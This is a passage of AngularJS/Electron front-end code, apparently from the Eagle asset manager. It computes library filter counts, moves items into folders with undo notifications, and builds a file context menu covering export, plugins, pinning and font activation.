                $("#box-container").trigger("scroll");
            }, 500);

        }, 100, true);

        $scope.getDateFilterCountsArray = function (type) {
            try {
                var arr = [];
                Object.keys(eagle.filter.filterCounts[type]['year/month']).forEach(function (key) {
                    arr.push({
                        key: key,
                        value: eagle.filter.filterCounts[type]['year/month'][key]
                    })
                });
                return arr;
            }
            catch (err) {
                return [];
            }
        }

        var calculateFilterCountsTimeout;
        $scope.calculateFilterCounts = function () {
            
            clearTimeout(calculateFilterCountsTimeout);
            calculateFilterCountsTimeout = setTimeout(function () {
                console.time("calculateFilterCounts");
                eagle.filter.resetFilterCounts();
                let now = Date.now();
                for (let i = 0; i < $scope.allData.length; i++) {
                    const image = $scope.allData[i];
                    $scope.updateFilterCounts(image, 1, now);
                }
                console.timeEnd("calculateFilterCounts");
                $scope.$evalAsync();
            }, 500);

        };

        $scope.updateFilterCounts = function (image, inc, now) {

            if (!image) return;

            try {

                var type = image.medium || image.ext;
                var shape;

                if (eagle.filter.filterCounts['type'][type] === undefined) {
                    eagle.filter.filterCounts['type'][type] = 1;
                }
                else {
                    eagle.filter.filterCounts['type'][type]+=inc;
                }

                if (image.rawMetas) {

                    var camera = image.rawMetas.camera;
                    if (eagle.filter.filterCounts['camera'][camera] === undefined) {
                        eagle.filter.filterCounts['camera'][camera] = 1;
                        if (!eagle.filter.filterCamerasMapping[camera]) {
                            eagle.filter.filterCamerasMapping[camera] = true;
                            eagle.filter.filterCameras = Object.keys(eagle.filter.filterCamerasMapping);
                        }
                    }
                    else {
                        eagle.filter.filterCounts['camera'][camera]+=inc;
                    }
                }

                if (image.fontMetas) {
                    try {
                        var key = Object.keys(image.fontMetas.postScriptName)[0];
                        var postScriptName = image.fontMetas.postScriptName && image.fontMetas.postScriptName[key];
                        if (installedFonts[`${postScriptName}_.${image.ext}`]) {
                            eagle.filter.filterCounts['fontActivated']['activated']+=inc;
                        }
                        else {
                            eagle.filter.filterCounts['fontActivated']['deactivated']+=inc;
                        }
                    }
                    catch (err) {

                    }
                }

                if (image.star) {
                    eagle.filter.filterCounts['rating'][image.star]+=inc;
                }
                else {
                    eagle.filter.filterCounts['rating']['0']+=inc;
                }

                // 形状筛选，只需要针对图片格式进行
                if (image.width && !AUDIO_TYPES[image.ext] && !FONT_TYPES[image.ext] ) {
                    if (image.width > image.height) {
                        if (image.width / image.height >= 2.5) {
                            shape = "panoramic-landscape";
                        }
                        else {
                            shape = "landscape";
                        }
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                    else if (image.width < image.height) {
                        if (image.height / image.width >= 2.5) {
                            shape = "panoramic-portrait";
                        }
                        else {
                            shape = "portrait";
                        }
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                    else if (image.width === image.height) {
                        shape = "square";
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                    if (image.width / image.height === 4 / 3) {
                        shape = "4:3";
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                    else if (image.width / image.height === 3 / 4) {
                        shape = "3:4";
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                    else if (image.width / image.height === 16 / 9) {
                        shape = "16:9";
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                    else if (image.width / image.height === 9 / 16) {
                        shape = "9:16";
                        eagle.filter.filterCounts['shape'][shape] += inc;
                    }
                }

        	}
        	catch (err) {
        	}
        }

        $scope.calculateDateFilter = function () {

            eagle.filter.filterCounts.import = {
                'today': 0,
                'yesterday': 0,
                '7day': 0,
                '30day': 0,
                '90day': 0,
                '365day': 0,
                "year/month": {},
            };

            eagle.filter.filterCounts.mtime = {
                'today': 0,
                'yesterday': 0,
                '7day': 0,
                '30day': 0,
                '90day': 0,
                '365day': 0,
                "year/month": {},
            };

            let now = Date.now();
            let today = new Date();
            today.setHours(0,0,0);
            let todayTime = today.getTime();
            let yesterdayTime = todayTime - DATE_1_DAY;

            for (let i = 0; i < $scope.allData.length; i++) {
                const image = $scope.allData[i];
                if (image.modificationTime > todayTime) eagle.filter.filterCounts['import']['today']++;
                else if (image.modificationTime < todayTime && image.modificationTime > yesterdayTime) eagle.filter.filterCounts['import']['yesterday']++;
                if (now - image.modificationTime < DATE_7_DAY) eagle.filter.filterCounts['import']['7day']++;
                if (now - image.modificationTime < DATE_30_DAY) eagle.filter.filterCounts['import']['30day']++;
                if (now - image.modificationTime < DATE_90_DAY) eagle.filter.filterCounts['import']['90day']++;
                if (now - image.modificationTime < DATE_365_DAY) eagle.filter.filterCounts['import']['365day']++;

                let importDate = new Date(image.modificationTime);
                let importYear = importDate.getFullYear();
                let importMonth = ("" + (importDate.getMonth() + 1)).padStart(2, "0");
                let dateObj = eagle.filter.filterCounts['import']['year/month'];
                let dateKey = `${importYear}/${importMonth}`;
                if (importYear) {
                    if (!dateObj[dateKey]) {
                         dateObj[dateKey] = 0;
                    }
                    dateObj[dateKey]++;
                }

                // 修改时间
                var mtime = image.mtime || image.modificationTime;
                if (mtime) {
                    if (mtime > todayTime) eagle.filter.filterCounts['mtime']['today']++;
                    else if (mtime < todayTime && mtime > yesterdayTime) eagle.filter.filterCounts['mtime']['yesterday']++;
                    if (now - mtime < DATE_7_DAY) eagle.filter.filterCounts['mtime']['7day']++;
                    if (now - mtime < DATE_30_DAY) eagle.filter.filterCounts['mtime']['30day']++;
                    if (now - mtime < DATE_90_DAY) eagle.filter.filterCounts['mtime']['90day']++;
                    if (now - mtime < DATE_365_DAY) eagle.filter.filterCounts['mtime']['365day']++;

                    let modifyDate = new Date(mtime);
                    let modifyYear = modifyDate.getFullYear();
                    let modifyMonth = ("" + (modifyDate.getMonth() + 1)).padStart(2, "0");
                    if (modifyYear) {
                        if (!eagle.filter.filterCounts['mtime']['year/month'][`${modifyYear}/${modifyMonth}`]) {
                             eagle.filter.filterCounts['mtime']['year/month'][`${modifyYear}/${modifyMonth}`] = 0;
                        }
                        eagle.filter.filterCounts['mtime']['year/month'][`${modifyYear}/${modifyMonth}`]++;
                    }
                }
            }
        }

        function autoResizeTagFilter () {
            var tagsLength = $scope.containTags.length;
            var height = tagsLength * 24 + 54;
            if ($scope.containerSize && $scope.containerSize.tagFilter) {
                if ($scope.containerSize.tagFilter > height) {
                    $(".tags-filter").height(height);
                }
                else {
                    $(".tags-filter").height($scope.containerSize.tagFilter);
                }
            }
        };

        $scope.addImagesToFolder = function (images, folder) {

            var origin = [];
            var originFolders = [];
            var originTags = [];

            // 同一個資料夾，不需要移動
            if (images.length === 1 && images[0].folders.indexOf(folder.id) !== -1) {
                return;
            }

            // 移除當前文件夾，放到新的文件夾
            images.forEach(function(image) {

                origin.push(image);
                originFolders.push(angular.copy(image.folders));
                originTags.push(angular.copy(image.tags));

                if (!image.folders) image.folders = [];
                if (!image.tags) image.tags = [];
                if (image.folders.indexOf(folder.id) === -1) {
                    image.folders.push(folder.id);
                    if (folder.extendTags) {
                        folder.extendTags.forEach(function(tag) {
                            if (image.tags.indexOf(tag) === -1) {
                                image.tags.push(tag);
                            }
                        });
                    }
                }
                image.isDeleted = false;

            });
            ayncsImagesChange(images);
            hiddenByCurrentFilter(images);

            $scope.calculateImageBinding({ ignoreSort: true }, function () {
                $scope.rebindRefresh(true);
                $scope.updateSelection();
            });

            var message = angular.element(document.body).injector().get('$filter')('i18n')("notify.image.moveToFolder", [
                { "property": "imageCount", "value": images.length },
                { "property": "folderName", "value": folder.name }
            ]);
            if (images.length === 1) { message = message.replace("images", "image"); }

            $scope.notify({
                message: message,
                duration: 4000,
            }, function () {
                origin.forEach(function (image, index) {
                    image.folders = originFolders[index];
                    image.tags = originTags[index];
                });
                $scope.images = origin;
                $scope.current = origin[0];
                $scope.calculateImageBinding({ ignoreSort: true }, function () {
                    $scope.rebindRefresh();
                    $scope.updateSelection();
                });
                ayncsImagesChange(origin);
            });

            electronLog && electronLog.info(`[app] Categorize ${images.length} files to ${folder.name}(${folder.id})`);
            analytics.event('File', 'Categorize', 'Context');
        };

        $scope.addToFolders = function(e) {
            if ($scope.selected.length > 0) {
                $rootScope.$broadcast("OPEN-ADD-FOLDER-MODAL", {
                    current: $scope.currentFolder,
                    folders: $scope.folders,
                    images: $scope.selected,
                    existsFolders: eagle.inspector.calculateFolders($scope.selected),
                });
            }
        };

        $scope.addToLastUsedFolder = function () {
            $scope.checkOperationSafety(function () {
                var recentFolders = $scope.getRecentFolders();
                if (!recentFolders || recentFolders.length === 0) return;
                if (!recentFolders[0] || !$scope.selected[0]) return;
                var folder = recentFolders[0];
                $scope.addToRecentFolders([folder.id]);
                $scope.addImagesToFolder($scope.selected, folder);
                if ($scope.viewMode === 'unfiled') {
                    var itemElements = $scope.getSelectedItemElements();
                    $rootScope.$broadcast("gl:removeItems", itemElements);
                    // 自動選取下一個圖片，如果沒有下一個，選上一個，都沒有就空
                    $scope.lastIndex = $scope.getSelection().start;
                    var next = $scope.allData[$scope.lastIndex + $scope.selected.length];
                    var prev = $scope.allData[$scope.lastIndex - 1];
                    if (next) {
                        $scope.selected = [next];
                        $scope.current = next;
                    }
                    else if (prev) {
                        $scope.selected = [prev];
                        $scope.current = prev;
                    }
                    else {
                        $scope.selected = [];
                        $scope.leaveDetailMode();
                    }
                }
            });
        };

        $scope.moveToFolders = function(e) {
            if ($scope.selected.length > 0) {
                $rootScope.$broadcast("MOVE_TO_FOLDER", {
                    current: $scope.currentFolder,
                    folders: $scope.folderList,
                    images: $scope.selected
                });
            }
        };

        $scope.openInPreviewWindow = function () {
            if ($scope.selected.length <= 20000) {
                var items = $scope.selected.filter(function (item) {
                    return (EagleConfig.SUPPORT_FORMATS[item.ext] || pluginModule?.previewExtension.thumbnailPluginMap[item.ext]) && !AUDIO_TYPES[item.ext];
                });
                if (items.length > 0) {
					openInNewWindow(items);
                    analytics.event('NewWindow', 'Open', items[0].ext);
                    RecentFileManager.addFiles(items);
                }
            }
        };

        $scope.searchImageByGoogle = () => {
            eagle.reverseImageSearch.search($scope.selected?.[0], ReverseImageSearch.ENGINES.GOOGLE);
        };

        $scope.searchImageByBaidu = () => {
            if (preferences.general.language === 'zh_CN') {
                eagle.reverseImageSearch.search($scope.selected?.[0], ReverseImageSearch.ENGINES.BAIDU);
            }
        };

        $scope.openActionsPanel = function (event) {
            $rootScope.$broadcast("OPEN_ACTIONS", {
                x: windowMouseX,
                y: windowMouseY,
                Actions: $scope.Actions,
            });
        };

        $scope.openInspectorTagSelectPanel = () => {
            if ($scope.selected.length === 0) return;
            InspectorTagSelectPanel.open();
        };

        $scope.openInspectorFolderSelectPanel = function (event) {
            event && event.stopPropagation();

            if ($scope.selected.length === 0) return;

            const folders = $scope.folders;
            const originalSelectedIds = eagle.inspector.calculateFolders($scope.selected).reduce((acc, cur) => {
                acc[cur] = true;
                return acc;
            }, {});
            
            FolderSelectPanel.open({
                folders: folders,
                selectedIds: originalSelectedIds,
                onChanged: (result) => {

                    if (!result?.isDirty) return;

                    const { selectedFolderIds, deselectedFolderIds } = result;
                    $scope.checkOperationSafety(() => {
                        try {
                            let selectedFolders = [];
                            let folderIds = [];
                            let selectedItems = [];

                            $scope.selected.forEach((item) => {
                                selectedItems.push(item);
                            });

                            Object.keys(selectedFolderIds).forEach((folderId) => {
                                if ($scope.folderMappings[folderId] && !originalSelectedIds[folderId]) {
                                    selectedFolders.push($scope.folderMappings[folderId]);
                                    folderIds.push(folderId);
                                }
                            });

                            $scope.addToRecentFolders(folderIds);

                            let origin = [];
                            let originFolders = [];
                            let originTags = [];
                            let originDeleted = [];

                            selectedItems.forEach((item) => {
                                origin.push(item);
                                originFolders.push(angular.copy(item.folders));
                                originTags.push(angular.copy(item.tags));
                                originDeleted.push(item.isDeleted);
                            });

                            let removedFolderIds = [];
                            Object.keys(deselectedFolderIds).forEach((folderId) => {
                                removedFolderIds.push(folderId);
                            });

                            let hasChanged = false;
                            let changedItems = [];
                            let changedMaps = {};

                            eagle.utils.tree.walk($scope.folders, 'children', (folder, parent) => {
                                // 添加新分类
                                if (selectedFolderIds[folder.id] && !deselectedFolderIds[folder.id]) {
                                    selectedItems.forEach((item) => {
                                        if (item.folders.indexOf(folder.id) === -1) {
                                            item.folders.push(folder.id);
                                            if (folder.extendTags) {
                                                folder.extendTags.forEach(function (tag) {
                                                    if (item.tags.indexOf(tag) === -1) {
                                                        item.tags.push(tag);
                                                    }
                                                });
                                            }
                                            item.isDeleted = false;
                                            hasChanged = true;
                                            changedItems.push(item);
                                            changedMaps[item.id] = true;
                                        }
                                    });
                                }


                                // 删除已有
                                else if (deselectedFolderIds[folder.id]) {
                                    selectedItems.forEach((item) => {
                                        var idx2 = item.folders.indexOf(folder.id);
                                        if (idx2 !== -1) {
                                            if ($scope.currentFolder && $scope.currentFolder.id === folder.id) {
                                                ig.remove($("#box-" + item.id)[0]);
                                                $scope.currentFolder.imagesMappings[item.id] = false;
                                            }
                                            item.folders.splice(idx2, 1);
                                            $scope.updateFilterCounts(item, -1);
                                            item.isDeleted = false;
                                            hasChanged = true;
                                            changedItems.push(item);
                                            changedMaps[item.id] = true;
                                        }
                                    });
                                }
                            });

                            changedItems = [...new Set(changedItems)];

                            if (hasChanged) {
                                ayncsImagesChange(changedItems);
                                hiddenByCurrentFilter(changedItems);
                                if ($bodyScope.viewMode === 'unfiled') {
                                    $rootScope.$broadcast("gl:removeItems", $bodyScope.getSelectedItemElements());
                                }

                                $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {
                                    $bodyScope.rebindRefresh(true);
                                    $bodyScope.updateSelection();
                                });

                                var message = $filter('i18n')("notify.image.moveToFolders", [
                                    { "property": "imageCount", "value": selectedItems.length },
                                    { "property": "folderCount", "value": selectedFolders.length }
                                ]);

                                if ($scope.selected.length === 1) {
                                    message = message.replace("images", "image");
                                }
                                if (selectedFolders.length === 1) {
                                    message = angular.element(document.body).injector().get('$filter')('i18n')("notify.image.moveToFolder", [
                                        { "property": "folderId", "value": selectedFolders[0].id },
                                        { "property": "imageCount", "value": selectedItems.length },
                                        { "property": "folderName", "value": selectedFolders[0].name }
                                    ]);
                                }

                                // 復原操作
                                $rootScope.notify({
                                    message: message,
                                    duration: 4000,
                                }, function () {
                                    origin.forEach((item, index) => {
                                        if (changedMaps[item.id]) {
                                            item.folders = originFolders[index];
                                            item.tags = originTags[index];
                                            item.isDeleted = originDeleted[index];
                                        }
                                    });
                                    $scope.selected = origin;
                                    $scope.current = origin[0];
                                    $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                                    $rootScope.$broadcast("REBIND_REFRESH", true);
                                    $rootScope.$broadcast("UPDATE_SELECTION");
                                });

                                electronLog && electronLog.info(`[app] Categorize ${selectedItems.length} files to ${selectedFolders.length} folders`);
                                analytics.event('File', 'Categorize', 'QuickCategorize');
                            }
                        }
                        catch (err) {
                            electronLog && electronLog.error(err.stack || err);
                        }
                    });
                }
            });
        };

        // 文件右鍵選單
        $scope.openItemContextMenu = async (event, target) => {

            if (event?.target?.tagName === 'INPUT') return;

            event.stopPropagation();

            if ($scope.selected.indexOf(target) === -1) return;
            removePlayingAudios();
            
            const item = target || $scope.current;
            const items = $scope.selected;
            const viewMode = $scope.viewMode;
            const isMultiple = items.length > 1;
            const isSupportFormat = EagleConfig.SUPPORT_FORMATS[item.ext];
            const isFullScreen = currentWindow.isFullScreen();
            const isDetailMode = $scope.isDetailMode;
            const isInFolderList = !!$scope.currentFolder;
            const canExportAs = items.reduce((acc, item) => {
                const SUPPORT_EXPORT_AS_FORMATS = { "jpg": true, "jfif": true, "jpe": true, "jpeg": true, "insp": true, "png": true, "gif": true, "webp": true, "bmp": true, "svg": true };
                if (!SUPPORT_EXPORT_AS_FORMATS[item.ext]) {
                    acc = false;
                }
                return acc;
            }, true);
            const canPreview = (isSupportFormat || pluginModule?.previewExtension.thumbnailPluginMap[item.ext]);

            // 檔案可以打開的資料夾
            const openInFolderMenuItems = item?.folders?.reduce((acc, folderId) => {
                const folder = $scope.folderMappings[folderId];
                if (!folder) return acc;
                acc.push({
                    label: folder.name,
                    keywords: 'open 打開 location 位置 eagle',
                    click: () => {
                        $scope.openItemLocation($scope.selected[0], folder);
                        $scope.$evalAsync();
                    }
                });
                return acc;
            }, []);

            // 檔案是否可以被 Eagle 正常解析預覽
            let canPin = false;
            if (isInFolderList) {
                canPin = items.slice(0, 100).reduce((acc, item) => {
                    if (!item.pinned || !item.pinned[$scope?.currentFolder?.id]) {
                        acc = false;
                    }
                    return acc;
                }, true);
            }

            // 添加到其它資源庫
            let historyLibraryMenu = {};
            historyLibraryMenu.items = $bodyScope.getLibraryHistory().filter((history) => {
                var isCurrent = false;
                if ($bodyScope.libraryPath) {
                    isCurrent = path.normalize(history.path) == path.normalize($bodyScope.libraryPath);
                }
                return !isCurrent;
            }).map((history) => {
                return {
                    label: history.name,
                    keywords: `${i18n.__('context.image.addToLibrary')} library 資源庫 add to`,
                    accelerator: history.dir,
                    icon: 'ic-library-logo.svg',
                    click: () => {
                        $rootScope.$broadcast("ADD_TO_LIBRARY", {
                            items: items,
                            library: history
                        });
                        $scope.$evalAsync();
                    }
                }
            });

            let openWithOtherMenuItem = {};
            if (process.platform === 'darwin') {
                let submenu = { items: [] };
                try {
                    const rawPath = FileUrlHelper.getRawPath(item);
                    const getAssociatedApplications = require(appRoot + '/my_modules/get-associated-application');
                    let asso = await getAssociatedApplications(FileUrlHelper.getRawPath(item));
                    asso.forEach((result) => {
                        try {
                            if (result.name === "Eagle.app") return;
                            submenu.items.push({
                                image: result.icon,
                                label: (result.default)? result.name + ` (${i18n.__("general.default")})` : result.name,
                                click: () => { openWithApplicationPath(result.path, rawPath, item); }
                            });
                        } catch (err) {}
                        if (result.default) {
                            submenu.items.push({
                                role: 'separator',
                            });
                        }
                    });
                }
                catch (err) {}
                openWithOtherMenuItem = {
                    visible: !isMultiple,
                    label: i18n.__('context.image.openInOthers'),
                    icon: 'ic-open-other.svg',
                    submenu: submenu
                }
            }
            else {
                openWithOtherMenuItem = {
                    visible: !isMultiple,
                    accelerator: 'Ctrl+Alt+Enter',
                    label: i18n.__('context.image.openInOthers'),
                    icon: 'ic-open-other.svg',
                    click: () => {
                        $scope.openWithOther();
                    }
                }
            }

            let pluginsMenuItems = [];
            const lastOpenedPluginsIds = pluginModule.getLastOpenedPlugins(3);
            const lastOpenedPluginsIdsMap = lastOpenedPluginsIds.reduce((acc, cur) => {
                acc[cur] = true;
                return acc;
            }, {});

            let lastOpenedPluginsMenuItems = [];
            let otherPluginsMenuItems = [];

            pluginModule.plugins.forEach((plugin) => {
                const manifest = plugin.manifest;
                const icon = `${URL_MODULE.pathToFileURL(`${plugin.path}/${manifest.logo}`).href}?t=${Date.now()}`;
                const name = manifest.name;
                const executable = !!manifest.main;
                if (executable) {
                    if (lastOpenedPluginsIdsMap[manifest.id]) {
                        lastOpenedPluginsMenuItems.push({
                            label: name,
                            image: icon,
                            accelerator: pluginModule.pluginShortcuts[manifest.id]??"",
                            keywords: `${i18n.__('general.plugin')} ${manifest.name} ${manifest?.keywords?.join(" ")}`,
                            click: () => {
                                pluginModule.open(plugin);
                            }
                        });
                    }
                    else {
                        otherPluginsMenuItems.push({
                            label: name,
                            image: icon,
                            accelerator: pluginModule.pluginShortcuts[manifest.id]??"",
                            keywords: `${i18n.__('general.plugin')} ${manifest.name} ${manifest?.keywords?.join(" ")}`,
                            click: () => {
                                pluginModule.open(plugin);
                            }
                        });
                    }
                }
            });

            lastOpenedPluginsMenuItems.sort((a, b) => {
                return lastOpenedPluginsIds.indexOf(a) - lastOpenedPluginsIds.indexOf(b);
            });

            otherPluginsMenuItems.sort((a, b) => {
                return a.label.localeCompare(b.label);
            });

            pluginsMenuItems = [{ role: 'label', label: i18n.__("modal.pluginPanel.label.recent") }, ...lastOpenedPluginsMenuItems, { role: 'separator' }, ...otherPluginsMenuItems];

            ContextMenu.open({
                items: [
                    // 還原
                    {
                        visible: item.isDeleted,
                        label: i18n.__('context.image.restore'),
                        keywords: 'restore 還原 戻す',
                        icon: 'ic-trash-restore.svg',
                        click: () => {
                            $scope.selected.forEach((item) => {
                                item.isDeleted = false;
                            });
                            $scope.calculateImageBinding({ ignoreSort: true }, () => {
                                $scope.rebindRefresh(true);
                            });
                            const itemElements = $scope.getSelectedItemElements();
                            $rootScope.$broadcast("gl:removeItems", itemElements);
                            ayncsImagesChange(items);
                            try { electronLog && electronLog.info(`[app] Restore ${items.length} files from trash`); } catch (err) {};
                            $scope.$evalAsync();
                        }
                    },
                    // --- (還原)
                    {
                        visible: item.isDeleted,
                        role: 'separator',
                    },
                    // 启用字型 (字體）
                    {
                        disabled: !(!$scope.isFontActivate(item) && !item.activating && !item.deactivating),
                        visible: !!FONT_TYPES[item.ext],
                        label: i18n.__('Context.Image.Font.Activate'),
                        keywords: 'font activate enable 啟用 啟動 字型 字體',
                        icon: 'ic-font-activate.svg',
                        click: () => { $scope.activateFonts(items); },
                    },
                    // 停用字型 (字體）
                    {
                        disabled: (!$scope.isFontActivate(item) && !item.activating && !item.deactivating),
                        visible: !!FONT_TYPES[item.ext],
                        label: i18n.__('Context.Image.Font.Deactivate'),
                        keywords: 'font deactivate disable 停用 停止 字型 字體',
                        icon: 'ic-font-deactivate.svg',
                        click: () => { $scope.deactivateFonts(items); },
                    },
                    // --- (字體）
                    {
                        visible: !!FONT_TYPES[item.ext],
                        role: 'separator',
                    },
                    // 设置当前画面为视频封面（視頻）
                    {
                        visible: !!VIDEO_TYPES[item.ext] && isDetailMode,
                        label: i18n.__('context.image.updateVideoThumbanil'),
                        keywords: 'cover thumbnail 封面',
                        icon: 'ic-video-update-thumbnail.svg',
                        click: () => {
                            $scope.setAsVideoThumbnail();
                        },
                    },
                    // 拷贝当前画面（視頻）
                    {
                        visible: !!VIDEO_TYPES[item.ext] && isDetailMode,
                        accelerator: 'Shift+C',
                        label: i18n.__("context.image.copyCurrentFrameToClipboard"),
                        keywords: 'cover thumbnail 封面 copy 複製',
                        icon: 'ic-video-copy-frame.svg',
                        click: () => {
                            $scope.videoScreenShot(true);
                        },
                    },
                    // 保存当前画面（視頻）
                    {
                        visible: !!VIDEO_TYPES[item.ext] && isDetailMode,
                        accelerator: 'Shift+S',
                        label: i18n.__("context.image.saveCurrentFrame"),
                        keywords: 'cover thumbnail 封面 save 儲存 保存',
                        icon: 'ic-video-save-frame.svg',
                        click: () => {
                            $scope.videoScreenShot();
                        },
                    },
                    // ---（視頻）
                    {
                        visible: !!VIDEO_TYPES[item.ext] && isDetailMode,
                        role: 'separator',
                    },
                    // 在新窗口打开
                    {
                        visible: canPreview && items.length <= 20000 && !AUDIO_TYPES[item.ext],
                        accelerator: 'CmdOrCtrl+O',
                        label: i18n.__('Context.Open.New.Window'),
                        keywords: 'open new window 開啟 打開 新視窗 新窗口',
                        icon: 'ic-open-new-window.svg',
                        click: () => {
                            $scope.openInPreviewWindow();
                        },
                    },
                    // 在默认应用打开
                    {
                        accelerator: 'Shift+Enter',
                        label: i18n.__('context.image.openInDefault'),
                        keywords: 'open default application 開啟 打開 默認 預設 應用',
                        icon: 'ic-open-default.svg',
                        click: () => {
                            $scope.openFilesWithDefault($scope.selected);
                            $scope.$evalAsync();
                        },
                    },
                    // 其它應用打開
                    openWithOtherMenuItem,
                    // 在访达中打开
                    {
                        label: (process.platform === 'darwin')? i18n.__('context.image.revealInFinder'): i18n.__('context.image.openInExplorer'),
                        keywords: 'open finder explorer 開啟 打開 資源管理器 資源管理員 文件管理器',
                        icon: (process.platform === 'darwin')? 'ic-open-finder.svg': 'ic-open-explorer.svg',
                        click: () => {
                            $scope.openInFinder();
                        },
                    },
                    // 打开文件所在的位置(單選)
                    {
                        visible: !isMultiple,
                        label: i18n.__("context.image.openItemLocation"),
                        icon: 'ic-open-eagle.svg',
                        submenu: {
                            items: [{
                                label: i18n.__("appmenu.view>all"),
                                keywords: `${i18n.__("context.image.openItemLocation")} open eagle 打開 location 位置`,
                                click: () => {
                                    $scope.openItemLocation(item, null);
                                    $scope.$evalAsync();
                                }
                            }, ...openInFolderMenuItems],
                        }
                    },
                    // 插件
                    {
                        visible: pluginsMenuItems.length > 0,
                        role: 'separator',
                    },
                    {
                        visible: pluginsMenuItems.length > 0,
                        label: i18n.__('general.plugin'),
                        icon: 'ic-plugin.svg',
                        submenu: {
                            items: pluginsMenuItems
                        },
                    },
                    // ---
                    {
                        role: 'separator',
                    },
                    // 添加至文件夹...
                    {
                        accelerator: $rootScope.preferences.shortcuts.keybinds['add.to'] || 'CmdOrCtrl+Shift+J',
                        label: i18n.__('context.image.addToFolder'),
                        keywords: 'add to folder 添加至文件夾 添加到資料夾',
                        icon: 'ic-folder-add-to.svg',
                        click: () => {
                            $scope.addToFolders();
                            $scope.$evalAsync();
                        },
                    },
                    // 添加至其它资源库...
                    {
                        label: i18n.__('context.image.addToLibrary'),
                        keywords: 'add to library 添加至資源庫',
                        icon: 'ic-library-add-to.svg',
                        submenu: historyLibraryMenu
                    },
                    // 导出
                    {
                        label: i18n.__("context.image.export"),
                        keywords: 'export 匯出 導出',
                        icon: 'ic-export.svg',
                        submenu: {
                            items: [
                                {
                                    label: i18n.__("context.image.export>eaglepack"),
                                    keywords: `${i18n.__("context.image.export")} export eaglepack 匯出 導出`,
                                    icon: 'ic-export-eaglepack.svg',
                                    accelerator: 'CmdOrCtrl+Shift+E',
                                    click: () => {
                                        $scope.exportSelectedAsEaglepack();
                                    }
                                },
                                {
                                    label: i18n.__("context.image.export>computer"),
                                    keywords: `${i18n.__("context.image.export")} export computer 匯出 導出 電腦`,
                                    icon: 'ic-export-computer.svg',
                                    accelerator: 'CmdOrCtrl+E',
                                    click: () => {
                                        $scope.exportSelectedAsFolder();
                                    }
                                },
                                {
                                    visible: canExportAs,
                                    label: i18n.__("context.image.exportAsFormat"),
                                    icon: 'ic-export-format.svg',
                                    keywords: `${i18n.__("context.image.export")} export as format 匯出 導出 格式`,
                                    accelerator: 'Shift+E',
                                    click: () => {
                                        $scope.exportSelectedAsFormat();
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    // 分享
                    {
                        visible: process.platform === 'darwin',
                        label: i18n.__("context.image.share"),
                        keywords: 'share 分享',
                        icon: 'ic-share.svg',
                        keepOpen: true,
                        click: () => {
                            const filePaths = items.map((item) => {
                                return FileUrlHelper.getRawPath(item);
                            });
                            const shareMenu = new remote.ShareMenu( { filePaths: filePaths } );
                            shareMenu.popup();
                        },
                    },
                    // ---
                    {
                        role: 'separator',
                    },
                    // 置頂（文件夾列表）
                    {
                        visible: isInFolderList && !canPin,
                        label: i18n.__("context.image.pin>pin"),
                        keywords: 'pin 置頂',
                        icon: 'ic-pin.svg',
                        click: () => {
                            // TODO 需重構獨立成 function
                            $scope.checkOperationSafety(() => {
                                var now = Date.now();
                                $scope.selected.forEach((item, index) => {
                                    if (!item.pinned) { item.pinned = {} };
                                    if ($rootScope.selectedFolders?.length > 0) {
                                        // 取得 item folders 和 $rootScope.selectedFolders 的交集
                                        const folders = item.folders.filter((folderId) => {
                                            return $rootScope.selectedFoldersMappings[folderId];
                                        });
                                        folders.forEach((folderId) => {
                                            item.pinned[folderId] = now - index;
                                        });
                                    }
                                    else {
                                        item.pinned[$scope.currentFolder.id] = now - index;
                                    }
                                });
                                ayncsImagesChange($scope.selected);
                                var message = $filter('i18n')("notify.pinned.pin", [
                                    { "property": "count", "value": $scope.selected.length },
                                ]);
                                $scope.notify({
                                    message: message,
                                    duration: 1500
                                });
                                $scope.rebindRefresh();
                                $scope.scrollToSelectedItem();
                                $scope.$evalAsync();
                            });
                        },
                    },
                    // 取消置頂（文件夾列表）
                    {
                        visible: isInFolderList && canPin,
                        label: i18n.__("context.image.pin>unpin"),
                        keywords: 'unpin 取消置頂',
                        icon: 'ic-unpin.svg',
                        click: () => {
                            // TODO 需重構獨立成 function
                            $scope.checkOperationSafety(() => {
                                var now = Date.now();
                                $scope.selected.forEach((item, index) => {
                                    if (!item.pinned) return;
                                    if ($rootScope.selectedFolders?.length > 0) {
                                        // 取得 item folders 和 $rootScope.selectedFolders 的交集
                                        const folders = item.folders.filter((folderId) => {
                                            return $rootScope.selectedFoldersMappings[folderId];
                                        });
                                        folders.forEach((folderId) => {
                                            delete item.pinned[folderId];
                                        });
                                    }
                                    else {
                                        delete item.pinned[$scope.currentFolder.id];
                                    }
                                    if (Object.keys(item.pinned).length === 0) {
                                        delete item.pinned;
                                    }
                                });
                                ayncsImagesChange($scope.selected);
                                var message = $filter('i18n')("notify.pinned.unpin", [
                                    { "property": "count", "value": $scope.selected.length },
                                ]);
                                $scope.notify({
                                    message: message,
                                    duration: 1500
                                });
                                $scope.selected = [$scope.getNext()];
                                $scope.rebindRefresh();
                                $scope.scrollToSelectedItem();
                                $scope.$evalAsync();
                            });
                        },
                    },
                    // ---（文件夾列表）
                    {
                        visible: isInFolderList,
                        role: 'separator',
                    },
                    // 設為文件夾封面（文件夾列表）
                    {
                        visible: isInFolderList,
                        accelerator: 'Alt+Shift+C',
                        label: i18n.__('context.image.setAsCover'),
                        keywords: 'set as cover 設為封面',
                        icon: 'ic-folder-set-cover.svg',
                        click: () => {
                            $scope.setFolderCover();
                            $scope.$evalAsync();
                        },
                    },
                    // ---（文件夾列表）
                    {
                        visible: isInFolderList,
                        role: 'separator',
                    },
                    // 用所选项目新建文件夹(多選)
                    {
                        visible: isMultiple,
                        label: $filter('i18n')("context.image.addImageToNewFolder", [
                            { "property": "count", "value": items.length }
                        ]),
                        keywords: 'folder selection new',
                        icon: 'ic-folder-new-with-selection.svg',
                        click: () => {
                            $scope.newFolderWidthSelection();
                        },
                    },
                    // 重命名(多選)
                    {
                        accelerator: 'CmdOrCtrl+R',
                        visible: isMultiple,
